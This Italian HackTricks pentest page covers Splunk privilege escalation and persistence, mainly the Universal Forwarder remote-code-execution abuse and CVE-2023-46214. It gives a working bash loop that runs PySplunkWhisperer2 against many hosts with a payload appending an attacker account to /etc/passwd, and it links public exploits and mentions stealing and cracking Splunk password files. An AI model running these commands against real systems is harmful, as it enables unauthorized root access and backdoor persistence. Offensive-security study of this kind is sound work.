# Splunk LPE e Persistenza

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Se **enumerando** una macchina **internamente** o **esternamente** trovi **Splunk in esecuzione** (porta 8090), se per fortuna conosci delle **credenziali valide** puoi **abusare del servizio Splunk** per **eseguire una shell** come l'utente che esegue Splunk. Se è in esecuzione come root, puoi ottenere privilegi di root.

Inoltre, se sei **già root e il servizio Splunk non è in ascolto solo su localhost**, puoi **rubare** il **file delle password** dal servizio Splunk e **craccare** le password o **aggiungere nuove** credenziali ad esso. E mantenere la persistenza sull'host.

Nella prima immagine qui sotto puoi vedere come appare una pagina web di Splunkd.



## Sommario dell'exploit dell'Agente Splunk Universal Forwarder

Per ulteriori dettagli consulta il post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Questo è solo un sommario:

**Panoramica dell'exploit:**
Un exploit mirato all'Agente Splunk Universal Forwarder (UF) consente agli attaccanti con la password dell'agente di eseguire codice arbitrario sui sistemi in cui è in esecuzione l'agente, compromettendo potenzialmente un'intera rete.

**Punti chiave:**
- L'agente UF non convalida le connessioni in ingresso o l'autenticità del codice, rendendolo vulnerabile all'esecuzione di codice non autorizzato.
- I metodi comuni di acquisizione delle password includono la loro individuazione nelle directory di rete, nelle condivisioni di file o nella documentazione interna.
- L'exploit riuscito può portare all'accesso a livello di SYSTEM o root sugli host compromessi, all'esfiltrazione dei dati e all'infiltrazione ulteriore nella rete.

**Esecuzione dell'exploit:**
1. L'attaccante ottiene la password dell'agente UF.
2. Utilizza l'API di Splunk per inviare comandi o script agli agenti.
3. Le azioni possibili includono l'estrazione di file, la manipolazione degli account utente e la compromissione del sistema.

**Impatto:**
- Compromissione completa della rete con autorizzazioni a livello di SYSTEM/root su ogni host.
- Possibilità di disabilitare la registrazione per eludere la rilevazione.
- Installazione di backdoor o ransomware.

**Esempio di comando per l'exploit:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploit pubblici utilizzabili:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abuso delle query di Splunk

**Per ulteriori dettagli, consulta il post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

Il **CVE-2023-46214** consentiva di caricare uno script arbitrario in **`$SPLUNK_HOME/bin/scripts`** e poi spiegava che utilizzando la query di ricerca **`|runshellscript script_name.sh`** era possibile **eseguire** lo **script** memorizzato lì.


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
